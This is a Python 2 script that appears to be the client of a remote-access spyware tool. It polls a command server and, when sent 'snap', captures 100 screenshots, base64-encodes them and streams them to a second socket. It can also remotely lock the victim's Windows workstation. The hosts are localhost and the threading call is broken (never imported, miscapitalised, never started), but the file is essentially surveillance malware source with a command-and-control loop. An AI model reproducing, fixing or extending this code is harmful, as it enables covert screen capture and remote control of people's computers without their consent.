import socket
import time
import random
import ImageGrab
from PIL import Image
import uuid
import os
import base64
import ctypes

global userid

DEBUG = 1

def log(msg):
	if DEBUG:
		print msg
	return


def lockscreen_handler():
	ctypes.windll.user32.LockWorkStation()
	return

def snap_handler(userid):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1", 10000))
	for i in xrange(100):
		log('Getting snap num {0}'.format(i))
		snapshot = ImageGrab.grab()
		save_path = "C:\\Users\\user\\MySnapshot.jpg"
		snapshot.save(save_path)
		snapid = str(uuid.uuid4())
		log('got snap, snapid: ' + snapid)
		# Send
		f = open(save_path, 'rb')
		while True:
			log('Reading from snap')
			raw_data = f.read(500000)
			if not raw_data:
				log('breaking')
				break
			encoded_data = base64.b64encode(raw_data)
			msg = "{0},{1},{2}".format(userid, snapid, encoded_data)
			s.send(msg)
			time.sleep(0.1)
			log('Sent snap')

		# finish, remove the file
		f.close()
		os.remove(save_path)


def main():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1", 8002))
	log('connected')
	userid = random.randint(1,10001)
	log('userid' + str(userid))
	s.send(str(userid))
	s.recv(1024)
	log('before while')
	while True:
		s.send("KeepAlive!")
		log('sleeping')
		time.sleep(5)
		req = s.recv(1024)
		print 'Do request: ' + req
		if req == 'snap':
			threading.thread(target=snap_handler, args=(userid,))
		if req == 'lockscreen':
			lockscreen_handler()
		elif req == 'nojobs':
			print 'no jobs for me!'

if __name__ == '__main__':
	main()